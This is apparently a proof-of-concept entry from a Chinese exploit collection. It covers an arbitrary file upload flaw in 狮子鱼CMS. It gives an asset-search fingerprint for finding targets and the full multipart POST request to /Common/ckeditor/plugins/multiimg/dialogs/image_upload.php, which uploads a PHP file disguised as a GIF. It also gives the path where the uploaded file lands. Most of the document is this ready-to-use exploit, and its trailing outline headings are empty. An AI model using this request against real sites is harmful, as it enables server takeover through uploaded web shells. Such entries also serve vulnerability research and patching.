# 狮子鱼CMSimage_upload存在任意文件上传漏洞

- **系统**：狮子鱼　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="狮子鱼CMS"`
- **请求**：`POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 162`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="files"; filename="1.php"
Content-Type: image/gif
<?php phpinfo(); ?>
--00content0boundary00--

上传文件位置
/Common/image/uploads/1706112079179.php
```

**其他**
- 狮子鱼CMS image\_upload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 狮子鱼CMS